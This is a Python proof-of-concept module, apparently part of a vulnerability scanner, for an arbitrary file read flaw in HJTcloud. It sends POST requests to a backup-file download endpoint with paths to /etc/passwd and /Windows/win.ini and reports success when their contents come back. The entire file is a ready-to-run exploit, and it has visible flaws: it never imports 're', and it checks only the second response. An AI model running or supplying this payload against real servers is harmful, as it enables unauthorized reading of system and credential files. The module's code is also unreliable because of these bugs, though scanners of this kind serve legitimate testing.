import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''HJTcloud Arbitrary File Read''',
        "description": '''''',
        "severity": "high",
        "references": [
            "https://mp.weixin.qq.com/s/w2pkj5ADN7b5uxe-wmfGbw"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["hjtcloud", "lfi"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/fileDownload?action=downloadBackupFile"""
        method = "POST"
        data = """fullPath=/etc/passwd"""
        headers = {'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/fileDownload?action=downloadBackupFile"""
        method = "POST"
        data = """fullPath=/Windows/win.ini"""
        headers = {'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""root:.*:0:0:""",resp1.text) or re.search(r"""bit app support""",resp1.text)) and (resp1.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url